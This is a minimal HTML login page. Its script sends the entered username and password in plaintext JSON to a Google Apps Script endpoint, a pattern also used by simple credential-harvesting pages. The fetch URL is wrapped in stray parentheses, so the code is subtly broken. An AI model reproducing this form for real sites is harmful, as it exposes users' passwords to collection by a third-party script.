<!DOCTYPE html>
<html>
<head>
  <title>Login Page</title>
</head>
<body>
  <h2>Login</h2>
  <form id="loginForm">
    <label for="username">Username:</label><br>
    <input type="text" id="username" required><br><br>
    <label for="password">Password:</label><br>
    <input type="password" id="password" required><br><br>
    <button type="submit">Submit</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch("(https://script.google.com/macros/s/AKfycbw4Bp5ml23nkHWGT2jW76wvgHB8YR3Tfmdh-tikytE7F9WcaLiW7gXlqSnxGQP5zOok/exec)", {
        method: "POST",
        body: JSON.stringify({ username, password }),
        headers: { "Content-Type": "application/json" }
      })
      .then(response => response.text())
      .then(responseData => {
        alert("Response: " + responseData);
        document.getElementById("loginForm").reset();
      })
      .catch(err => alert("Error: " + err));
    });
  </script>
</body>
</html>
